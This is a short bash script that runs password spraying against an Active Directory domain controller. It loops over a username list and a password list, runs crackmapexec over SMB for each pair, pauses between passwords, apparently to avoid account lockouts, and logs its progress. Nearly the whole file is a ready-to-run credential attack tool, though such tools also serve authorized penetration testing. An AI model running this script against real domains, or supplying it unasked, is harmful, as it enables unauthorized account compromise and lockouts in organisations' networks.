#!/usr/bin/env bash
# 2021 Douglas Berdeaux @RackünSec
#
# Recursive CME spraying: per user each password.
# Creates log file.
#
# usage: ./ad-spray.sh <passwd file> <user file> <IP of DC> <interval to rest in seconds>
dc_ip=$3
passwd_file=$1
user_file=$2
interval=$4
printf "[i] Spraying DC: $dc_ip\n"
printf "[i] Password list: $passwd_file\n"
printf "[i] Username list: $user_file\n"
printf "[i] Rest interval: $interval seconds\n"
logfile="ad-spray-${dc_ip}_int_${interval}_$(date '+%s').txt"
printf "[i] Log file: ${logfile}\n"
printf "====================================================\n"
printf "[?] Continue? (CTRL+C to quit at anytime) (y/n)? "
read ans
trap ctrl_c INT
function ctrl_c() {
  exit 1
}
if [[ "$ans" == "y" ]]
then
  for passwd in $(cat $passwd_file | tr -d '\r') # destroy new lines
    do
      for user in $(cat $user_file | tr -d '\r')
        do
          #printf "[i] CME: ($user):($passwd)\n" # DEBUG
          crackmapexec smb $dc_ip -u $user -p "$passwd"
        done; sleep $4
    echo "[log] Full user list $user_file tested with $passwd => Complete." >> $logfile
    done
fi
